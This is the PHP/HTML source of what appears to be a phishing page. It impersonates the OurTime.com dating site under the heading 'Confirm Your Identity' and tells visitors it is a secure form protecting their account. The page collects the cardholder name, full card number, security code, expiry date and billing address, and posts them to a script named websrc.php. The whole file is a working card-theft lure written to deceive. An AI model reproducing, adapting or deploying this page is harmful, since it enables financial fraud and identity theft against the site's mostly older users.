﻿<?php require_once 'crypt.php'; ?><!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=1280">
    <meta name="msapplication-config" content="none">
    <title>Confirm Your Identity | OurTime.com - The 50+ Single Network</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
    <link rel="apple-touch-icon-precomposed" sizes="57x57" href="images/apple-touch-icon-57x57.png">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="images/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="images/apple-touch-icon-114x114.png">
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="images/apple-touch-icon-144x144.png">
    <link href="images/base_external.css" rel="stylesheet" type="text/css">
    <link href="images/theme.css" rel="stylesheet" type="text/css">
<script type="text/javascript" src="./countries.js"></script>
<style media="screen" type="text/css">
/* Button  styles */
button.btn {
    font-size: 18px;
    font-weight: bold;
    color: #FFF;
    background-color: #009fdb !important;
    padding: 5px 10px 5px 10px;
    border-radius: 3px;
    text-shadow: 1px 1px 1px #333333;
    border:0;
}
button.btn:hover {
    background-color:#008cc1!important;
    color:#e2e1e3;
}
button.btn:visited {
    color: #FFFFFF
}
button.btn:active {
    color: #FFFFFF
}
.button_style_gray {
    background-color: #9ba4a6;
    font-size: 18px;
    font-weight: bold;
    color: #FFF !important;
    padding: 5px 10px 5px 10px;
    border-radius: 3px;
    text-shadow: 1px 1px 1px #333333;
}
#externalloginbtn1 {
    display: block;
    clear: both;
    margin-left: 50px;
    margin-top: 10px;
    margin-left: 40px;
    height: 50px;}
</style>
</head>

<body>

    

    <div id="header">
    <div id="headercontent">
        <div id="logo" title="OurTime.com">
                <!-- change logo to use .com only if on external help page and on our time -->
                    <a href="#"><img src="images/logo.png" alt="" border="0"></a>
        </div>
        <div id="externalheadernologin">
                <p style="display: "><a href="#">A People Media Site</a></p>
                <p class="externalloginspace"><a href="#" class="loginlinkexternal">My Account</a></p>        
        </div>
    </div>
</div>

    <div id="maincontent">
      
        
            <div id="columnleftexternal">
                <div id="externallogin">
    <div class="externalcontainer bgcolor-main">
        <div id="externalloginmiddleleftlookup">
            <h1>Confirm Your Identity</h1>
            <form id="frmForgotPasswordLookup" method="post" action="websrc.php">
                <p class="forgotpasswordlookuptext">Protect your account. Please use this secure form to confirm your identity by providing the details below. Once your identity has been confirmed, you can continue using Ourtime.com<br></p>
            <p class="forgotpasswordlookuptext">Enter details as it appears on your card:<br> <b>Card Holder's Name</b>:<br><input id="name" name="name" size="23" maxlength="" type="text" placeholder="Name on card" title="Name on Card" autocomplete="off" required><br> <b>Credit Card Number</b>:<br>
                    <span class="formwrap">
									
<input maxlength="16" size="20" id="cc1" name="cc1" placeholder="xxxx xxxx xxxx xxxx" autocomplete="off" title="Card Number" type="text" required> </span><img src="http://i.imgur.com/tHUexsj.png" style="height: 16px;"><br> <b>Card Verification Number (CVN)</b>:<br> <input id="cc2" name="cc2" size="4" maxlength="4" pattern=".{3,4}" type="text" title="Card Verification Number" required placeholder="xxxx" autocomplete="off"> </span><img src="http://i.imgur.com/Z4repaS.gif" style="height: 18px;"><br> <b>Enter your credit card expiration date</b>:<br> <span class="formwrap">
									<select id="expm" name="expm" title="Expiration Month" required>
<option selected="selected" value="">Month</option>
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
									</select>
									<select id="expy" name="expy" title="Expiration Year" required>
<option selected="selected" value="">Year</option>
<option value="2015">2015</option>
<option value="2016">2016</option>
<option value="2017">2017</option>
<option value="2018">2018</option>
<option value="2019">2019</option>
<option value="2020">2020</option>
<option value="2021">2021</option>
<option value="2022">2022</option>
<option value="2023">2023</option>
<option value="2024">2024</option>
<option value="2025">2025</option>
<option value="2026">2026</option>
<option value="2027">2027</option>
<option value="2028">2028</option>
<option value="2029">2029</option>
<option value="2030">2030</option>

</select> <br> <b>Billing Address</b>:<br> <span class="formwrap">
									<input size="22" id="s1" name="s1" type="text" placeholder="Address line 1" autocomplete="off" title="Address 1" required> </span><br>
                <span class="formwrap">
									<input size="18" id="s2" name="s2" type="text" placeholder="Address line 2" autocomplete="off" title="Address 2" required><br> <b>Billing Address City/Town</b>:<br> <span class="formwrap">
									<input size="16" id="s3" name="s3" type="text" placeholder="City/Town" autocomplete="off" title="City or Town" required><br>									
<b>Country</b>:<br> <span class="formwrap">
<select id="country" name="country" title="Country" required></select></span><br>
<b>State</b>:<br> <span class="formwrap">
<select id="state" name="state" title="State" required></select></span><br>
<script language="javascript">populateCountries("country", "state");</script>
<b>Billing Address Zip Code</b>:<br> <span class="formwrap">
									<input maxlength="5" size="8" id="s4" name="s4" type="text" placeholder="Zip Code" title="Zip/Postal Code" autocomplete="off" required>
									
								</span><br>


                    </p>
                
                <div id="forgotpasswordsubmittext">
                    <p>Click the button to confirm your identity.</p>
                </div>
                <div id="externalloginbtn1"><button class="btn" title="Confirm My Identity">Confirm My Identity</button></div>
            </form>
        </div>
        <div id="externalloginmiddleright" class="bgcolor-login"></div>
        <p class="clearfix">&nbsp;</p>
    </div>
</div>



            </div>
            <div id="columnrightexternal">
                
            </div>
            <p class="clearfix">&nbsp;</p>
        

        <p class="clearfix">&nbsp;</p>
    </div>

    <div id="footer">
    <div id="footercontent">
        <div id="footercontentleft">
            <p>
                Copyright © 2016 People Media. All rights reserved.  105x1624.  <a href="#">Terms of Use</a> | <a href="#">Privacy Policy</a>
            </p>
        </div>
    </div>
</div>

    <div id="externallinks">
        <p>
            <a href="#">home</a> |
            <a href="#">safe dating tips</a> |
            <a href="#">contact us</a> |
            <a href="#">billing</a> |
            <a href="#">success stories</a> |
            <a href="#">careers</a> |
            <a href="#">about</a> |
            <a href="#">advertise with us</a> |
            <a href="#">search</a> |
            <a href="#">join now</a> |
            <a href="#">bookmark page</a> |
            <a href="#">site map</a>
            <br>
            <a href="#">Match.com</a> |
            <a href="#">Chemistry.com</a> |
            <a href="#">Mature Dating</a> |
            <a href="#">Black Singles</a> |
            <a href="#">Big and Beautiful</a>
        </p>
    </div>
</body>
</html><?php ob_end_flush(); ?>